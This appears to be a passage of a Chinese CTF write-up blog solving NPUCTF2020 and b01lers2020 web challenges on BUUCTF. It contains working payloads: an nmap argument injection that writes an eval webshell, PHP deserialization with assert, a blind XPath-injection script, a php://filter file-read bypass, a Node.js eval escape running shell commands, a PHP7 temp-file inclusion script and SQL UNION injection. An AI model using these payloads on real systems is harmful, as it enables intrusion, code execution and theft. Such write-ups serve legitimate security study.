<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 读文件：</span><br><span class="line">TARGET SPECIFICATION:</span><br><span class="line">  -iL &lt;inputfilename&gt;: Input from list of hosts/networks</span><br><span class="line">  </span><br><span class="line"># 写文件：</span><br><span class="line">OUTPUT:</span><br><span class="line">  -oN/-oX/-oS/-oG &lt;file&gt;: Output scan in normal, XML, s|&lt;rIpt kIddi3,</span><br><span class="line">     and Grepable format, respectively, to the given filename.</span><br><span class="line">  -oA &lt;basename&gt;: Output in the three major formats at once</span><br></pre></td></tr></table></figure>

<p>所以我们可以这样读文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1&#x27; -iL /flag -oN kk.txt &#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111511.png" alt="image-20200519162615497"></p>
<p>当然你还可以直接写 shell，这里 php 被过滤了，稍微用短标签和 phtml 绕过一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1&#x27; &lt;?= @eval($_REQUEST[1]);?&gt; -oG kk.phtml &#x27;</span><br></pre></td></tr></table></figure>



<h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p><strong>代码注入</strong></p>
<p>查看源码接口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;百万前端的NPU报时中心为您报时：&lt;a href=&quot;./time.php?source&quot;&gt;&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">#error_reporting(0);</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a = &quot;Y-m-d h:i:s&quot;;</span><br><span class="line">        $this-&gt;b = &quot;date&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $a = $this-&gt;a;</span><br><span class="line">        $b = $this-&gt;b;</span><br><span class="line">        echo $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = new HelloPhp;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;source&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[&quot;data&quot;]);</span><br></pre></td></tr></table></figure>

<p>常用的命令函数被 ban 了，但是 assert 没有，直接构造，flag 在 phpinfo 里</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?data=O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="NPUCTF2020-ezlogin"><a href="#NPUCTF2020-ezlogin" class="headerlink" title="[NPUCTF2020]ezlogin"></a>[NPUCTF2020]ezlogin</h2><p><strong>xpath注入 + 任意读文件</strong></p>
<p>查看 js 源码发现只有登陆成功就会跳到 admin.php，而且提交的数据是直接进行拼接的，猜测这里是 xpath 注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var data = &quot;&lt;username&gt;&quot;+username+&quot;&lt;/username&gt;&quot;+&quot;&lt;password&gt;&quot;+password+&quot;&lt;/password&gt;&quot;+&quot;&lt;token&gt;&quot;+token+&quot;&lt;/token&gt;&quot;; </span><br></pre></td></tr></table></figure>

<blockquote>
<p>不了解 xpath 可以先学习一下</p>
<p><a href="https://www.runoob.com/xpath/xpath-tutorial.html">https://www.runoob.com/xpath/xpath-tutorial.html</a></p>
<p>xpath 注入可以参考这篇文章</p>
<p><a href="https://www.tr0y.wang/2019/05/11/XPath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/">https://www.tr0y.wang/2019/05/11/XPath注入指北/</a></p>
</blockquote>
<p>具体注入脚本如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">import requests as rq</span><br><span class="line">import re, string</span><br><span class="line"></span><br><span class="line">url = &quot;http://f2f86738-985d-4624-abbf-4ddf7606133d.node3.buuoj.cn/&quot;</span><br><span class="line">cookies = &#123;&quot;PHPSESSID&quot;:&quot;478b12d3ea2eb03ae7a71cc867b05c08&quot;&#125;</span><br><span class="line">headers = &#123;&quot;Content-Type&quot;:&quot;application/xml&quot;&#125;</span><br><span class="line">path = &quot;/root/accounts/user[id=2]/password&quot;</span><br><span class="line">number = 0</span><br><span class="line">cnt = 1</span><br><span class="line">length = 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_token():</span><br><span class="line">    res = rq.get(url, cookies=cookies)</span><br><span class="line">    token = re.findall(r&#x27;id=&quot;token&quot; value=&quot;(.+?)&quot;&#x27;, res.text)[0]</span><br><span class="line">    return token</span><br><span class="line"></span><br><span class="line">def get_number():</span><br><span class="line">    index = 1</span><br><span class="line">    while True:</span><br><span class="line">        token = get_token()</span><br><span class="line">        username = &quot;&#x27; or count(&#123;&#125;)=&#123;&#125; or &#x27;1&quot;.format(path, index)</span><br><span class="line">        payload = &quot;&lt;username&gt;&#123;&#125;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span><br><span class="line">        data = payload.format(username, token)</span><br><span class="line">        res = rq.post(url + &quot;/login.php&quot;, headers=headers, data=data, cookies=cookies)</span><br><span class="line">        print(f&quot;[*] index: &#123;index&#125; &#123;res.text&#125;&quot;)</span><br><span class="line">        if &quot;非法操作!&quot; in res.text:</span><br><span class="line">            global number</span><br><span class="line">            number = index</span><br><span class="line">            print(f&quot;[+] number: &#123;index&#125;&quot;)</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            index += 1</span><br><span class="line"></span><br><span class="line">def get_length():</span><br><span class="line">    index = 1</span><br><span class="line">    while True:</span><br><span class="line">        token = get_token()</span><br><span class="line">        username = &quot;&#x27; or string-length(name(&#123;&#125;/*[&#123;&#125;]))=&#123;&#125; or &#x27;1&quot;.format(path, cnt, index)</span><br><span class="line">        payload = &quot;&lt;username&gt;&#123;&#125;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span><br><span class="line">        data = payload.format(username, token)</span><br><span class="line">        res = rq.post(url + &quot;/login.php&quot;, headers=headers, data=data, cookies=cookies)</span><br><span class="line">        print(f&quot;[*] index: &#123;index&#125; &#123;res.text&#125;&quot;)</span><br><span class="line">        if &quot;非法操作!&quot; in res.text:</span><br><span class="line">            global length</span><br><span class="line">            length = index</span><br><span class="line">            print(f&quot;[+] length: &#123;index&#125;&quot;)</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            index += 1</span><br><span class="line"></span><br><span class="line">def get_name():</span><br><span class="line">    name = &#x27;&#x27;</span><br><span class="line">    for index in range(1, length + 1): </span><br><span class="line">        for ch in string.printable:</span><br><span class="line">            token = get_token()</span><br><span class="line">            username = &quot;&#x27; or substring(name(&#123;&#125;/*[&#123;&#125;]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27; or &#x27;1&quot;.format(path, cnt, index, ch)</span><br><span class="line">            payload = &quot;&lt;username&gt;&#123;&#125;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span><br><span class="line">            data = payload.format(username, token)</span><br><span class="line">            res = rq.post(url + &quot;/login.php&quot;, headers=headers, data=data, cookies=cookies)</span><br><span class="line">            print(f&quot;[*] index: &#123;index&#125; ch: &#123;ch&#125; &#123;res.text&#125;&quot;)</span><br><span class="line">            if &quot;非法操作!&quot; in res.text:</span><br><span class="line">                name += ch</span><br><span class="line">                print(f&quot;[+] name: &#123;flag&#125;&quot;)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">def get_vaule():</span><br><span class="line">    vaule = &#x27;&#x27;</span><br><span class="line">    index = 1</span><br><span class="line">    while True:</span><br><span class="line">        for ch in string.printable:</span><br><span class="line">            token = get_token()</span><br><span class="line">            username = &quot;&#x27; or substring(&#123;&#125;, &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27; or &#x27;1&quot;.format(path, index, ch)</span><br><span class="line">            payload = &quot;&lt;username&gt;&#123;&#125;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span><br><span class="line">            data = payload.format(username, token)</span><br><span class="line">            res = rq.post(url + &quot;/login.php&quot;, headers=headers, data=data, cookies=cookies)</span><br><span class="line">            print(f&quot;[*] index: &#123;index&#125; ch: &#123;ch&#125; &#123;res.text&#125;&quot;)</span><br><span class="line">            if ch == string.printable[-1]:</span><br><span class="line">                print(f&quot;[+] vaule: &#123;vaule&#125;&quot;)</span><br><span class="line">                return</span><br><span class="line">            if &quot;非法操作!&quot; in res.text:</span><br><span class="line">                vaule += ch</span><br><span class="line">                index += 1</span><br><span class="line">                print(f&quot;[+] vaule: &#123;vaule&#125;&quot;)</span><br><span class="line">                break</span><br><span class="line">            </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">    &lt;accounts&gt;</span><br><span class="line">        &lt;user&gt;</span><br><span class="line">            &lt;id&gt; 1 &lt;/id&gt;</span><br><span class="line">            &lt;username&gt; guest &lt;/id&gt;</span><br><span class="line">            &lt;password&gt; xxxx &lt;/password&gt;</span><br><span class="line">        &lt;/user&gt;</span><br><span class="line">        &lt;user&gt;</span><br><span class="line">            &lt;id&gt; 2 &lt;/id&gt;</span><br><span class="line">            &lt;username&gt; adm1n &lt;/username&gt;</span><br><span class="line">            &lt;password&gt; cf7414b5bdb2e65ee43083f4ddbc4d9f &lt;/password&gt;</span><br><span class="line">        &lt;/user&gt;</span><br><span class="line">    &lt;/accounts&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    # get_number()</span><br><span class="line">    # get_length()</span><br><span class="line">    # get_name()</span><br><span class="line">    get_vaule()</span><br></pre></td></tr></table></figure>

<p>拿去 somd5 破解一下得到 admin 密码 <code>adm1n:gtfly123</code> </p>
<p>进去之后拿到题是 flag 在 &#x2F;flag，一看 url 显然是个任意读文件，&#x2F;etc&#x2F;passwd 读取成功，访问 &#x2F;flag 显示返回的页面中含有敏感内容，php 和 base 被 waf，但是可以大小写绕过，payload 如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/admin.php?file=pHp://filter/convert.baSe64-encode/resource=/flag</span><br></pre></td></tr></table></figure>



<h2 id="NPUCTF2020-验证🐎"><a href="#NPUCTF2020-验证🐎" class="headerlink" title="[NPUCTF2020]验证🐎"></a>[NPUCTF2020]验证🐎</h2><p><strong>node.js</strong></p>
<p>查看源码</p>
<p>验证码的第一个逻辑</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])</span><br></pre></td></tr></table></figure>

<p>我们可以根据 js 中任意类型 + 字符串 &#x3D; 字符串的特性绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;e&quot;:&quot;1&quot;,&quot;first&quot;:[0],&quot;second&quot;:&quot;0&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>然后就是绕命令执行</p>
<p>{“e”:”1”,”first”:[0],”second”:”0”}</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function saferEval(str) &#123;</span><br><span class="line">  if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, &#x27;&#x27;)) &#123;</span><br><span class="line">    return null;</span><br><span class="line">  &#125;</span><br><span class="line">  return eval(str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里是使用了 js 的箭头函数进行绕过，然后通过 constructor 导出 Function 函数，利用 fromCharCode 编写 exp</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111709.png" alt="image-20200523230936254"></p>
<p>最后参照官方 payload 写出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests as rq</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def gen(cmd):</span><br><span class="line">    s = f&quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;&#123;cmd&#125;&#x27;).toString()&quot;</span><br><span class="line">    return &#x27;,&#x27;.join([str(ord(i)) for i in s])</span><br><span class="line"></span><br><span class="line">url = &quot;http://b8c28475-b09e-4632-9fc7-cf582bde39f0.node3.buuoj.cn/&quot;</span><br><span class="line">headers = &#123;&quot;Connection&quot;:&quot;close&quot;,&quot;Content-Type&quot;:&quot;application/json&quot;&#125;</span><br><span class="line">cookies = &#123;&quot;PHPSESSION&quot;:&quot;eyJhZG1pbiI6MCwicmVzdWx0cyI6W119&quot;,&quot;PHPSESSION.sig&quot;:&quot;dOk8zRUiKwDaXbIyGNaaZdAmC9k&quot;&#125;</span><br><span class="line"></span><br><span class="line">cmd = &quot;cat /flag&quot;</span><br><span class="line">payload = &#x27;((Math)=&gt;(Math=Math.constructor,Math.constructor(Math.fromCharCode(&#123;&#125;))))(Math+1)()&#x27;.format(gen(cmd))</span><br><span class="line"></span><br><span class="line">data = &#x27;&#123;&quot;e&quot;:&quot;%s&quot;,&quot;first&quot;:[0],&quot;second&quot;:&quot;0&quot;&#125;&#x27; % (payload)</span><br><span class="line">res = rq.post(url, data=data, cookies=cookies, headers=headers)</span><br><span class="line"></span><br><span class="line">flag = re.findall(r&#x27;&lt;div id=&quot;res&quot;&gt;([\s\S]+?)&lt;/div&gt;&#x27;, res.text)[0].strip()</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>



<h2 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2><p><strong>哈希长度拓展攻击 + php7 文件包含</strong></p>
<p>源码提示如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--md5($secret.$name)===$pass --&gt;</span><br></pre></td></tr></table></figure>

<p>是个哈希长度拓展攻击的典型代码，这里不知道 secret 的长度，所以需要爆破</p>
<blockquote>
<p>hashpumpy 的安装在 Windows 上需要  Microsoft Visual C++ 14.0</p>
<p>不想安装的朋友请移步 Linux</p>
</blockquote>
<p>爆了很久发现根本爆破不了（x</p>
<p>看了看别人的题解据说是出题人出错了，填入 name 和 pass，然后用 cookie 的 hash 值替换一下 pass 就可以了：）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=1&amp;pass=576322dd496b99d07b5b0f7fa7934a25</span><br></pre></td></tr></table></figure>

<p>抓包发现它会跳转到一个 flflflflag.php，然后再跳转到 404.html，flflflflag.php 处有个文件包含</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;</span><br><span class="line">           window.location.href=&quot;404.html&quot;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">include($_GET[&quot;file&quot;])&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>读不到常规 flag，所以我们需要命令执行，所以我们需要有个地方上传文件，读一下它的源码过滤了 data|input|zip 协议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=flflflflag.php</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;</span><br><span class="line">           window.location.href=&quot;404.html&quot;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;this_is_not_fl4g_and_å•ºé¢•äºº_wants_girlfriend&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(preg_match(&#x27;/data|input|zip/is&#x27;,$file))&#123;</span><br><span class="line">    die(&#x27;nonono&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">@include($file);</span><br><span class="line">echo &#x27;include($_GET[&quot;file&quot;])&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>这里是会用到了 php7 的一个 bug，php 包含自身导致死循环的时候，同时上传一个文件，这个文件会得到保存，参考如下链接</p>
<p><a href="https://www.jianshu.com/p/dfd049924258">https://www.jianshu.com/p/dfd049924258</a></p>
<p>这里为了降低难度给了一个 dir.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(scandir(&#x27;/tmp&#x27;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>顺便看了眼别人的 wp，flag 在 phpinfo，所以最终 payload 如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests as rq</span><br><span class="line">from io import BytesIO</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">url  = &quot;http://3976dcb8-83fd-4f63-9f84-1fb9ab24c6bd.node3.buuoj.cn/&quot;</span><br><span class="line"></span><br><span class="line"># upload payload</span><br><span class="line">payload = &quot;&lt;?php phpinfo() ?&gt;&quot;</span><br><span class="line">params = &#123;&quot;file&quot;:&quot;php://filter/string.strip_tags/resource=/etc/passwd&quot;&#125;</span><br><span class="line">files = &#123;&#x27;file&#x27;: BytesIO(payload.encode())&#125;</span><br><span class="line">res1 = rq.post(url + &#x27;flflflflag.php&#x27;, params=params, files=files)</span><br><span class="line"></span><br><span class="line"># find tmpfile</span><br><span class="line">res2 = rq.get(url + &#x27;dir.php&#x27;)</span><br><span class="line">tmpfile = re.findall(r&#x27;&quot;(php[\S]&#123;6&#125;)&quot;&#x27;, res2.text)[0]</span><br><span class="line">tmpfile = &#x27;/tmp/&#x27; + tmpfile</span><br><span class="line"></span><br><span class="line"># get flag</span><br><span class="line">params = &#123;&quot;file&quot;:tmpfile&#125;</span><br><span class="line">res3 = rq.get(url + &#x27;flflflflag.php&#x27;, params=params)</span><br><span class="line">flag = re.findall(r&#x27;(flag&#123;.+?&#125;)&#x27;, res3.text)[0]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>



<h2 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h2><p><strong>娱乐题</strong></p>
<p>一只右键源码和查看 js 文件可以发现最后的 &#x2F;fight&#x2F; 接口下有如下 js</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Run to scramble original flag</span><br><span class="line">//console.log(scramble(flag, action));</span><br><span class="line">function scramble(flag, key) &#123;</span><br><span class="line">  for (var i = 0; i &lt; key.length; i++) &#123;</span><br><span class="line">    let n = key.charCodeAt(i) % flag.length;</span><br><span class="line">    let temp = flag[i];</span><br><span class="line">    flag[i] = flag[n];</span><br><span class="line">    flag[n] = temp;</span><br><span class="line">  &#125;</span><br><span class="line">  return flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function check_action() &#123;</span><br><span class="line">  var action = document.getElementById(&quot;action&quot;).value;</span><br><span class="line">  var flag = [&quot;&#123;hey&quot;, &quot;_boy&quot;, &quot;aaaa&quot;, &quot;s_im&quot;, &quot;ck!&#125;&quot;, &quot;_baa&quot;, &quot;aaaa&quot;, &quot;pctf&quot;];</span><br><span class="line"></span><br><span class="line">  // TODO: unscramble function</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>源码叫我们爆破，那我们当然要自己拼啦</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pctf&#123;hey_boys_im_baaaaaaaaaack!&#125;</span><br></pre></td></tr></table></figure>



<h2 id="b01lers2020-Life-on-Mars"><a href="#b01lers2020-Life-on-Mars" class="headerlink" title="[b01lers2020]Life on Mars"></a>[b01lers2020]Life on Mars</h2><p><strong>sql 注入</strong></p>
<p>查看 js 源码找到接口 <code>/query?search=&quot; + query</code></p>
<p>再看看 html 源码盲猜后台是 <code>select xx from $_GET[&#39;query&#39;]</code></p>
<p>注入 <code>?search=arabia_terra union select 1,2#</code> 即有回显</p>
<blockquote>
<p>不想手工的可以直接 sqlmap</p>
<p># sqlmap -u “<a href="http://xxxxx.node3.buuoj.cn/query?search=arabia_terra">http://xxxxx.node3.buuoj.cn/query?search=arabia_terra%20</a>“</p>
</blockquote>
<p>最终 payload 如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/query?search=amazonis_planitia UNION SELECT id, code FROM alien_code.code</span><br></pre></td></tr></table></figure>



<h2 id="b01lers2020-Space-Noodles"><a href="#b01lers2020-Space-Noodles" class="headerlink" title="[b01lers2020]Space Noodles"></a>[b01lers2020]Space Noodles</h2><p><strong>脑洞题</strong></p>
<blockquote>
<p>开头先列一下 HTTP 的请求方法，下面会用到</p>
</blockquote>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">方法</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">GET</td>
<td align="left">请求指定的页面信息，并返回实体主体。</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">HEAD</td>
<td align="left">类似于 GET 请求，只不过返回的响应中没有具体的内容，用于获取报头</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">POST</td>
<td align="left">向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST 请求可能会导致新的资源的建立和&#x2F;或已有资源的修改。</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left">PUT</td>
<td align="left">从客户端向服务器传送的数据取代指定的文档的内容。</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left">DELETE</td>
<td align="left">请求服务器删除指定的页面。</td>
</tr>
<tr>
<td align="left">6</td>
<td align="left">CONNECT</td>
<td align="left">HTTP&#x2F;1.1 协议中预留给能够将连接改为管道方式的代理服务器。</td>
</tr>
<tr>
<td align="left">7</td>
<td align="left">OPTIONS</td>
<td align="left">允许客户端查看服务器的性能。</td>
</tr>
<tr>
<td align="left">8</td>
<td align="left">TRACE</td>
<td align="left">回显服务器收到的请求，主要用于测试或诊断。</td>
</tr>
<tr>
<td align="left">9</td>
<td align="left">PATCH</td>
<td align="left">是对 PUT 方法的补充，用来对已知资源进行局部更新 。</td>
</tr>
</tbody></table>
<p>这题有点魔幻，一上来就让我们猜五个接口，看源码就可以看到格式了</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111658.png" alt="image-20200521224548138"></p>
<p>接口如下</p>
<ul>
<li><code>/circle/one/</code>;</li>
<li><code>/two/</code>;</li>
<li><code>/square/</code>;</li>
<li><code>/com/seaerch/</code>;</li>
<li><code>/vim/quit/</code>.</li>
</ul>
<p><strong>接口 &#x2F;circle&#x2F;one&#x2F;</strong></p>
<p>GET、POST 不行试了一下万能 OPTIONS 有回显，是一个 PDF</p>
<p>先下载下来，好像没什么用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X OPTIONS http://95d801c2-a4ba-4d3f-9027-e36053308fa7.node3.buuoj.cn/circle/one/ --output one.pdf</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111653.png" alt="image-20200521225335651"></p>
<p><strong>接口 &#x2F;two&#x2F;</strong></p>
<p>PUT 请求返回</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Put the dots???</span><br></pre></td></tr></table></figure>

<p>CONNECT 请求会返回一个 .png 文件，我们继续下下来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X CONNECT http://95d801c2-a4ba-4d3f-9027-e36053308fa7.node3.buuoj.cn/two/ --output two.png</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111853.png" alt="image-20200521225932745"></p>
<p>得到文字</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">up_on_noodles</span><br></pre></td></tr></table></figure>



<p><strong>接口 &#x2F;square&#x2F;</strong></p>
<p>DELETE 请求也有一个 .png 文件，是个文字游戏</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X DELETE http://95d801c2-a4ba-4d3f-9027-e36053308fa7.node3.buuoj.cn/square/ --output three.png</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111900.png" alt="image-20200521230252676"></p>
<p>游戏答案</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    E</span><br><span class="line">    S</span><br><span class="line">    I</span><br><span class="line">    R</span><br><span class="line">    P</span><br><span class="line">  E R</span><br><span class="line">  C E</span><br><span class="line">  A T</span><br><span class="line">E P N</span><br><span class="line">TASTES</span><br><span class="line"> L A U</span><br><span class="line"> D U L</span><br><span class="line"> E   A</span><br><span class="line"> R   C</span><br><span class="line"> A   O</span><br><span class="line"> A</span><br><span class="line"> N</span><br></pre></td></tr></table></figure>

<p>得到文字</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tastes</span><br></pre></td></tr></table></figure>



<p><strong>接口 &#x2F;com&#x2F;seaerch&#x2F;</strong></p>
<p>GET 请求会返回</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;htlm&gt;</span><br><span class="line"></span><br><span class="line">,,,,,,,,,&lt;search&gt; &lt;-- comment for search --!&gt;:</span><br><span class="line"></span><br><span class="line">  ERROR &lt;/&gt; search=null&lt;/end&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>要用到 search 参数，但是 ?search&#x3D;1 没东西，所以我们放到 POST 那里试试看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 8</span><br><span class="line"></span><br><span class="line">search=1</span><br></pre></td></tr></table></figure>

<p>结果返回</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;htlm&gt;</span><br><span class="line"></span><br><span class="line">,,,,,,,,,&lt;search&gt; &lt;-- comment for search --!&gt;:</span><br><span class="line"></span><br><span class="line">  &lt;query&gt; 1 is not a good search, please use this one instead: &#x27;flag&#x27; &lt;try&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>那我们就输入 flag，得到了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;htlm&gt;</span><br><span class="line"></span><br><span class="line">,,,,,,,,,&lt;search&gt; &lt;-- comment for search --!&gt;:</span><br><span class="line"></span><br><span class="line">  &lt;query&gt; good search&lt;/query&gt;</span><br><span class="line">  results: &lt;p&gt;_good_in_s&lt;/p&gt;:w</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>得到文字</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_good_in_s</span><br></pre></td></tr></table></figure>



<p><strong>接口 &#x2F;vim&#x2F;quit&#x2F;</strong></p>
<blockquote>
<p>BUUCTF 没法复现 TRACE 请求</p>
</blockquote>
<p>这里的预期解是发送</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TRACE /vim/quit/?exit=:wq</span><br></pre></td></tr></table></figure>

<p>就会得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   &lt;hteeemel&lt;body&gt;&gt;</span><br><span class="line"></span><br><span class="line">      &lt;flag&gt; well done wait &lt;/flag&gt;</span><br><span class="line">&lt;text&gt; this one/&gt; &lt;flag&gt;pace_too&#125;&lt;/flag&gt;</span><br><span class="line"></span><br><span class="line">&lt;/&gt;</span><br></pre></td></tr></table></figure>

<p>得到文字</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pace_too&#125;</span><br></pre></td></tr></table></figure>

<p>上面 5 个接口拿到的文字拼起来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pctf&#123;ketchup_on_noodles_tastes_good_in_space_too&#125;</span><br></pre></td></tr></table></figure>



